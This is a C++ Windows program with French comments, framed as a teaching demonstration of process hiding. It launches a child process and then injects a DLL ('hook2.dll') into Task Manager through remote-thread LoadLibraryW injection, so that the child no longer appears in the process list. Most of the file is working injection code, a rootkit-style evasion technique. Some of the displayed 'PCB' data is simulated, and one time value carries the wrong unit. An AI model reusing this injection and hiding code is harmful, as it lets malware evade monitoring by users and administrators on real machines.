#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>

// Énumération pour l'état du processus
enum class ProcessState {
    CREATED,
    READY,
    RUNNING,
    WAITING,
    TERMINATED
};

// Structure pour le contexte CPU (simplifiée)
struct CPUContext {
    DWORD eax, ebx, ecx, edx;
    DWORD esi, edi;
    DWORD esp, ebp;
    DWORD eip;
    DWORD eflags;
};

// Structure pour les segments mémoire
struct MemorySegment {
    LPVOID base_address;
    SIZE_T size;
    DWORD protection;
};

// Structure PCB complète
struct PCB {
    // 1. Identifiants
    DWORD pid;
    DWORD ppid;
    DWORD uid;
    DWORD gid;

    // 2. État
    ProcessState state;
    DWORD exit_code;

    // 3. Compteurs et horaires
    LPVOID program_counter;
    ULONGLONG cpu_time_used;
    FILETIME creation_time;
    FILETIME exit_time;
    FILETIME kernel_time;
    FILETIME user_time;

    // 4. Planification
    DWORD priority;
    DWORD base_priority;

    // 5. Mémoire
    MemorySegment code_segment;
    MemorySegment data_segment;
    MemorySegment stack_segment;
    SIZE_T working_set_size;
    SIZE_T peak_working_set_size;
    SIZE_T pagefile_usage;
    DWORD handle_count;

    // 6. Contexte CPU (simulé)
    CPUContext cpu_context;

    // 7. Threads
    DWORD thread_count;
    std::vector<DWORD> thread_ids;

    // 8. Sécurité
    DWORD session_id;

    // 9. Informations générales
    std::wstring image_name;
    std::string command_line;
};
std::wstring GetDllPath() {
    WCHAR modulePath[MAX_PATH];
    GetModuleFileNameW(NULL, modulePath, MAX_PATH);

    // Remplacer le nom de l'exe par le nom de la DLL
    WCHAR* lastBackslash = wcsrchr(modulePath, L'\\');
    if (lastBackslash) {
        wcscpy(lastBackslash + 1, L"hook2.dll");
    }

    return std::wstring(modulePath);
}

// Fonction pour obtenir le PID d'un processus par son nom
static DWORD GetProcessIdByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcout << L"Erreur CreateToolhelp32Snapshot: " << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        std::wcout << L"Erreur Process32First: " << GetLastError() << std::endl;
        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (_wcsicmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

// Fonction pour injecter une DLL dans un processus cible
static bool InjectDll(DWORD targetPid, const std::wstring& dllPath) {
    // Étape 1: Ouvrir le processus cible avec tous les droits
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) {
        std::wcout << L"Erreur OpenProcess: " << GetLastError() << std::endl;
        return false;
    }

    // Étape 2: Allouer de la mémoire dans le processus cible
    SIZE_T dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, dllPathSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMemory) {
        std::wcout << L"Erreur VirtualAllocEx: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Étape 3: Écrire le chemin de la DLL dans la mémoire allouée
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath.c_str(), dllPathSize, NULL)) {
        std::wcout << L"Erreur WriteProcessMemory: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Étape 4: Obtenir l'adresse de LoadLibraryW dans kernel32.dll
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (hKernel32 == NULL) {
        std::wcout << L"Erreur GetModuleHandleW: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryW");
    if (pLoadLibrary == NULL) {
        std::wcout << L"Erreur GetProcAddress: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Étape 5: Créer un thread distant qui appelle LoadLibraryW
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, NULL);
    if (!hRemoteThread) {
        std::wcout << L"Erreur CreateRemoteThread: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Attendre que le thread termine (chargement de la DLL)
    WaitForSingleObject(hRemoteThread, INFINITE);

    // Nettoyer les ressources
    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::wcout << L"Injection réussie dans le processus PID: " << targetPid << std::endl;
    return true;
}

// Fonction utilitaire pour vérifier si un processus existe
static bool IsProcessRunning(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProcess) {
        CloseHandle(hProcess);
        return true;
    }
    return false;
}

// Fonction pour récupérer les informations PCB complètes d'un processus
static PCB GetCompletePCB(DWORD pid, const std::wstring& processName) {
    PCB pcb = {};
    pcb.pid = pid;
    pcb.image_name = processName;
    pcb.state = ProcessState::RUNNING; // Par défaut

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess) {
        // 1. Identifiants
        pcb.ppid = 0;
        pcb.uid = GetCurrentProcessId();

        // 2. État et code de sortie
        GetExitCodeProcess(hProcess, &pcb.exit_code);
        if (pcb.exit_code != STILL_ACTIVE) {
            pcb.state = ProcessState::TERMINATED;
        }

        // 3. Temps d'exécution
        if (GetProcessTimes(hProcess, &pcb.creation_time, &pcb.exit_time,
            &pcb.kernel_time, &pcb.user_time)) {
            // Convertir les FILETIME en ULONGLONG pour le temps CPU utilisé
            ULARGE_INTEGER kernel, user;
            kernel.LowPart = pcb.kernel_time.dwLowDateTime;
            kernel.HighPart = pcb.kernel_time.dwHighDateTime;
            user.LowPart = pcb.user_time.dwLowDateTime;
            user.HighPart = pcb.user_time.dwHighDateTime;
            pcb.cpu_time_used = kernel.QuadPart + user.QuadPart;
        }

        // 4. Planification
        pcb.priority = GetPriorityClass(hProcess);
        pcb.base_priority = GetPriorityClass(hProcess);

        // 5. Mémoire
        PROCESS_MEMORY_COUNTERS pmc;
        if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
            pcb.working_set_size = pmc.WorkingSetSize;
            pcb.peak_working_set_size = pmc.PeakWorkingSetSize;
            pcb.pagefile_usage = pmc.PagefileUsage;

            // Récupérer le nombre de handles
            DWORD handleCount = 0;
            if (GetProcessHandleCount(hProcess, &handleCount)) {
                pcb.handle_count = handleCount;
            }

            // Segments mémoire (simulés)
            pcb.code_segment.base_address = (LPVOID)0x400000;
            pcb.code_segment.size = pmc.WorkingSetSize / 3;
            pcb.code_segment.protection = PAGE_EXECUTE_READ;

            pcb.data_segment.base_address = (LPVOID)0x500000;
            pcb.data_segment.size = pmc.WorkingSetSize / 3;
            pcb.data_segment.protection = PAGE_READWRITE;

            pcb.stack_segment.base_address = (LPVOID)0x600000;
            pcb.stack_segment.size = pmc.WorkingSetSize / 3;
            pcb.stack_segment.protection = PAGE_READWRITE;
        }

        // 6. Contexte CPU (simulé pour la démonstration)
        pcb.cpu_context.eax = 0x12345678;
        pcb.cpu_context.ebx = 0x87654321;
        pcb.cpu_context.ecx = 0x11111111;
        pcb.cpu_context.edx = 0x22222222;
        pcb.cpu_context.esi = 0x33333333;
        pcb.cpu_context.edi = 0x44444444;
        pcb.cpu_context.esp = 0x0019FF00;
        pcb.cpu_context.ebp = 0x0019FF88;
        pcb.cpu_context.eip = 0x00401000;
        pcb.cpu_context.eflags = 0x00000246;

        // 7. Threads
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            THREADENTRY32 te32;
            te32.dwSize = sizeof(THREADENTRY32);

            if (Thread32First(hSnapshot, &te32)) {
                do {
                    if (te32.th32OwnerProcessID == pid) {
                        pcb.thread_count++;
                        pcb.thread_ids.push_back(te32.th32ThreadID);
                    }
                } while (Thread32Next(hSnapshot, &te32));
            }
            CloseHandle(hSnapshot);
        }

        // 8. Sécurité
        pcb.session_id = 1;

        CloseHandle(hProcess);
    }

    return pcb;
}

// Fonction pour afficher le PCB complet
static void DisplayCompletePCB(const PCB& pcb) {
    std::wcout << L"\n";
    std::wcout << L"================================================================" << std::endl;
    std::wcout << L"              PROCESS CONTROL BLOCK (PCB) COMPLET" << std::endl;
    std::wcout << L"================================================================" << std::endl;

    // 1. Identifiants
    std::wcout << L"--- IDENTIFIANTS ---" << std::endl;
    std::wcout << L"PID: " << pcb.pid << std::endl;
    std::wcout << L"PPID: " << pcb.ppid << std::endl;
    std::wcout << L"UID: " << pcb.uid << std::endl;
    std::wcout << L"Nom: " << pcb.image_name << std::endl;

    // 2. État
    std::wcout << L"\n--- ÉTAT ---" << std::endl;
    std::wstring state_str;
    switch (pcb.state) {
    case ProcessState::CREATED: state_str = L"CRÉÉ"; break;
    case ProcessState::READY: state_str = L"PRÊT"; break;
    case ProcessState::RUNNING: state_str = L"EN EXÉCUTION"; break;
    case ProcessState::WAITING: state_str = L"EN ATTENTE"; break;
    case ProcessState::TERMINATED: state_str = L"TERMINÉ"; break;
    }
    std::wcout << L"État: " << state_str << std::endl;
    std::wcout << L"Code sortie: " << (pcb.exit_code == STILL_ACTIVE ? L"ACTIF" : std::to_wstring(pcb.exit_code)) << std::endl;

    // 3. Temps et compteurs
    std::wcout << L"\n--- TEMPS/CPU ---" << std::endl;
    std::wcout << L"Temps CPU utilisé: " << (pcb.cpu_time_used / 10000000) << L" ns" << std::endl;
    std::wcout << L"Threads: " << pcb.thread_count << std::endl;
    std::wcout << L"Handles: " << pcb.handle_count << std::endl;

    // 4. Planification
    std::wcout << L"\n--- PLANIFICATION ---" << std::endl;
    std::wcout << L"Priorité: " << pcb.priority << std::endl;
    std::wcout << L"Priorité de base: " << pcb.base_priority << std::endl;

    // 5. Mémoire
    std::wcout << L"\n--- MÉMOIRE ---" << std::endl;
    std::wcout << L"Working Set: " << (pcb.working_set_size / 1024) << L" KB" << std::endl;
    std::wcout << L"Pic Working Set: " << (pcb.peak_working_set_size / 1024) << L" KB" << std::endl;
    std::wcout << L"Pagefile: " << (pcb.pagefile_usage / 1024) << L" KB" << std::endl;
    std::wcout << L"Segment Code: " << pcb.code_segment.base_address << L" (" << (pcb.code_segment.size / 1024) << L" KB)" << std::endl;
    std::wcout << L"Segment Données: " << pcb.data_segment.base_address << L" (" << (pcb.data_segment.size / 1024) << L" KB)" << std::endl;
    std::wcout << L"Segment Pile: " << pcb.stack_segment.base_address << L" (" << (pcb.stack_segment.size / 1024) << L" KB)" << std::endl;

    // 6. Contexte CPU
    std::wcout << L"\n--- CONTEXTE CPU ---" << std::endl;
    std::wcout << L"EAX: 0x" << std::hex << pcb.cpu_context.eax << std::dec << std::endl;
    std::wcout << L"EBX: 0x" << std::hex << pcb.cpu_context.ebx << std::dec << std::endl;
    std::wcout << L"ECX: 0x" << std::hex << pcb.cpu_context.ecx << std::dec << std::endl;
    std::wcout << L"EDX: 0x" << std::hex << pcb.cpu_context.edx << std::dec << std::endl;
    std::wcout << L"ESI: 0x" << std::hex << pcb.cpu_context.esi << std::dec << std::endl;
    std::wcout << L"EDI: 0x" << std::hex << pcb.cpu_context.edi << std::dec << std::endl;
    std::wcout << L"ESP: 0x" << std::hex << pcb.cpu_context.esp << std::dec << std::endl;
    std::wcout << L"EBP: 0x" << std::hex << pcb.cpu_context.ebp << std::dec << std::endl;
    std::wcout << L"EIP: 0x" << std::hex << pcb.cpu_context.eip << std::dec << std::endl;
    std::wcout << L"EFLAGS: 0x" << std::hex << pcb.cpu_context.eflags << std::dec << std::endl;

    // 7. Threads
    std::wcout << L"\n--- THREADS ---" << std::endl;
    for (size_t i = 0; i < pcb.thread_ids.size() && i < 5; ++i) {
        std::wcout << L"TID: " << pcb.thread_ids[i] << std::endl;
    }
    if (pcb.thread_ids.size() > 5) {
        std::wcout << L"... et " << (pcb.thread_ids.size() - 5) << L" autres threads" << std::endl;
    }

    std::wcout << L"================================================================" << std::endl;
    std::wcout << L"\n";
}

// Fonction pour créer le fichier source C++ de process_child.exe
static bool CreateProcessChildSource() {
    std::ofstream srcFile("process_child.cpp");
    if (!srcFile) {
        return false;
    }

    // Code C++ SIMPLIFIÉ sans problèmes d'échappement
    srcFile << "#include <Windows.h>\n";
    srcFile << "#include <iostream>\n";
    srcFile << "#include <thread>\n";
    srcFile << "#include <chrono>\n\n";
    srcFile << "int main() {\n";
    srcFile << "    std::cout << \"=== PROCESSUS ENFANT process_child.exe ===\" << std::endl;\n";
    srcFile << "    std::cout << \"PID: \" << GetCurrentProcessId() << std::endl;\n";
    srcFile << "    std::cout << \"Demarrage reussi!\" << std::endl;\n";
    srcFile << "    std::cout << \"Ce processus s'executera pendant 5 minutes.\" << std::endl;\n";
    srcFile << "    \n";
    srcFile << "    // Boucle principale - 5 minutes = 300 secondes\n";
    srcFile << "    for (int i = 0; i < 300; i++) {\n";
    srcFile << "        if (i % 30 == 0) {\n";
    srcFile << "            std::cout << \"process_child.exe actif depuis \" << i \n";
    srcFile << "                      << \" secondes. PID: \" << GetCurrentProcessId() << std::endl;\n";
    srcFile << "        }\n";
    srcFile << "        std::this_thread::sleep_for(std::chrono::seconds(1));\n";
    srcFile << "    }\n";
    srcFile << "    \n";
    srcFile << "    std::cout << \"=== PROCESS_CHILD.EXE TERMINE ===\" << std::endl;\n";
    srcFile << "    return 0;\n";
    srcFile << "}\n";

    srcFile.close();
    return true;
}

// Fonction pour compiler process_child.exe
static bool CompileProcessChild() {
    std::wcout << L"Compilation de process_child.exe..." << std::endl;

    // Commande de compilation
    std::string compileCommand = "cl /EHsc /nologo process_child.cpp /link /out:process_child.exe /SUBSYSTEM:CONSOLE";

    // Exécuter la compilation
    int result = system(compileCommand.c_str());

    if (result != 0) {
        std::wcout << L"Erreur lors de la compilation de process_child.exe" << std::endl;
        return false;
    }

    std::wcout << L"Compilation réussie!" << std::endl;
    return true;
}

// Fonction pour nettoyer les fichiers temporaires
static void CleanupTempFiles() {
    remove("process_child.cpp");
    remove("process_child.obj");
}

// Fonction pour créer et exécuter process_child.exe
static PROCESS_INFORMATION CreateAndRunProcessChild() {
    std::wcout << L"Création de process_child.exe..." << std::endl;

    // Étape 1: Créer le fichier source
    if (!CreateProcessChildSource()) {
        std::wcout << L"Erreur: Impossible de créer le fichier source" << std::endl;
        PROCESS_INFORMATION pi = { 0 };
        return pi;
    }

    // Étape 2: Compiler l'exécutable
    if (!CompileProcessChild()) {
        std::wcout << L"Erreur: Impossible de compiler process_child.exe" << std::endl;
        PROCESS_INFORMATION pi = { 0 };
        return pi;
    }

    // Étape 3: Nettoyer les fichiers temporaires
    CleanupTempFiles();

    // Étape 4: Exécuter process_child.exe
    std::wcout << L"Lancement de process_child.exe..." << std::endl;

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessW(
        L"process_child.exe",           // Nom de l'exécutable
        NULL,                           // Arguments de ligne de commande
        NULL,                           // Attributs de sécurité du processus
        NULL,                           // Attributs de sécurité du thread
        FALSE,                          // Héritage des handles
        CREATE_NEW_CONSOLE,             // Nouvelle console
        NULL,                           // Environnement
        NULL,                           // Répertoire courant
        &si,                            // Startup info
        &pi                             // Process info
    )) {
        std::wcout << L"Erreur CreateProcessW: " << GetLastError() << std::endl;
        PROCESS_INFORMATION empty_pi = { 0 };
        return empty_pi;
    }

    return pi;
}

static int wmain(int argc, wchar_t* argv[]) {
    // Mode parent - logique principale d'injection
    std::wcout << L"=== DÉMONSTRATION PÉDAGOGIQUE - MASQUAGE DE PROCESSUS ===" << std::endl;
    std::wcout << L"Processus Parent (injector.exe) - PID: " << GetCurrentProcessId() << std::endl;

    // Chemin de la DLL à injecter
    std::wstring dllPath = GetDllPath();

    // Étape 1: Création et exécution de process_child.exe
    std::wcout << L"\n1. Création et exécution de process_child.exe..." << std::endl;

    PROCESS_INFORMATION pi = CreateAndRunProcessChild();

    if (pi.dwProcessId == 0) {
        std::wcout << L"Échec de la création du processus enfant." << std::endl;
        return 1;
    }

    std::wcout << L"Processus enfant créé avec succès!" << std::endl;
    std::wcout << L"PID: " << pi.dwProcessId << std::endl;
    std::wcout << L"Nom: process_child.exe" << std::endl;
    std::wcout << L"Durée: 5 minutes" << std::endl;
    std::wcout << L"Fichier: process_child.exe (créé dans le répertoire courant)" << std::endl;

    // Attendre que le processus soit bien lancé
    std::wcout << L"Attente du démarrage du processus enfant..." << std::endl;
    Sleep(3000);

    // Afficher les informations PCB COMPLÈTES du processus enfant
    std::wcout << L"\nAFFICHAGE DU PCB COMPLET DU PROCESSUS ENFANT:" << std::endl;
    PCB child_pcb = GetCompletePCB(pi.dwProcessId, L"process_child.exe");
    DisplayCompletePCB(child_pcb);

    // Vérification avant injection
    std::wcout << L"\n2. Vérification avant injection..." << std::endl;
    std::wcout << L"Le processus process_child.exe (PID: " << pi.dwProcessId
        << L") devrait être visible dans le Gestionnaire des tâches." << std::endl;
    std::wcout << L"Appuyez sur Entrée pour continuer...";
    std::wcin.get();

    // Étape 2: Recherche du Gestionnaire des tâches
    std::wcout << L"\n3. Recherche du Gestionnaire des tâches..." << std::endl;
    DWORD taskmgrPid = GetProcessIdByName(L"Taskmgr.exe");

    if (taskmgrPid == 0) {
        std::wcout << L"Task Manager non trouvé. Lancez-le et réessayez." << std::endl;
        if (pi.hProcess != NULL) TerminateProcess(pi.hProcess, 0);
        if (pi.hProcess != NULL) CloseHandle(pi.hProcess);
        if (pi.hThread != NULL) CloseHandle(pi.hThread);
        return 1;
    }

    std::wcout << L"Task Manager trouvé - PID: " << taskmgrPid << std::endl;

    // Étape 3: Injection de la DLL dans Task Manager
    std::wcout << L"\n4. Injection de la DLL dans Task Manager..." << std::endl;

    if (!InjectDll(taskmgrPid, dllPath)) {
        std::wcout << L"Échec de l'injection." << std::endl;
        if (pi.hProcess != NULL) TerminateProcess(pi.hProcess, 0);
        if (pi.hProcess != NULL) CloseHandle(pi.hProcess);
        if (pi.hThread != NULL) CloseHandle(pi.hThread);
        return 1;
    }

    // Vérification après injection
    std::wcout << L"\n5. Vérification après injection..." << std::endl;
    std::wcout << L"Le processus process_child.exe (PID: " << pi.dwProcessId
        << L") devrait maintenant être INVISIBLE dans le Gestionnaire des tâches." << std::endl;
    std::wcout << L"Le processus est toujours en cours d'exécution: "
        << (IsProcessRunning(pi.dwProcessId) ? L"OUI" : L"NON") << std::endl;

    // Réafficher les informations PCB pour confirmer que le processus existe toujours
    std::wcout << L"\nPCB ACTUALISÉ APRÈS MASQUAGE:" << std::endl;
    PCB updated_pcb = GetCompletePCB(pi.dwProcessId, L"process_child.exe");
    DisplayCompletePCB(updated_pcb);

    std::wcout << L"\n6. DÉMONSTRATION EN COURS..." << std::endl;
    std::wcout << L"process_child.exe continue de s'exécuter pendant 5 minutes." << std::endl;
    std::wcout << L"✓ Fichier process_child.exe créé dans le répertoire courant" << std::endl;
    std::wcout << L"✓ Processus masqué dans Task Manager" << std::endl;
    std::wcout << L"✓ Processus toujours actif (vérifiable avec les APIs)" << std::endl;
    std::wcout << L"✓ Durée totale: 5 minutes" << std::endl;

    std::wcout << L"\nAppuyez sur Entrée pour terminer la démonstration (le processus enfant continuera)...";
    std::wcin.get();

    // Nettoyage - fermer les handles mais laisser l'enfant s'exécuter
    if (pi.hProcess != NULL) CloseHandle(pi.hProcess);
    if (pi.hThread != NULL) CloseHandle(pi.hThread);

    std::wcout << L"\n=== DÉMONSTRATION TERMINÉE ===" << std::endl;
    std::wcout << L"Processus parent injector.exe arrêté." << std::endl;
    std::wcout << L"Processus enfant process_child.exe continue en arrière-plan pendant 5 minutes." << std::endl;
    std::wcout << L"Le fichier process_child.exe reste dans le répertoire courant." << std::endl;
    std::wcout << L"Vérifiez qu'il est invisible dans Task Manager mais toujours actif!" << std::endl;

    return 0;
}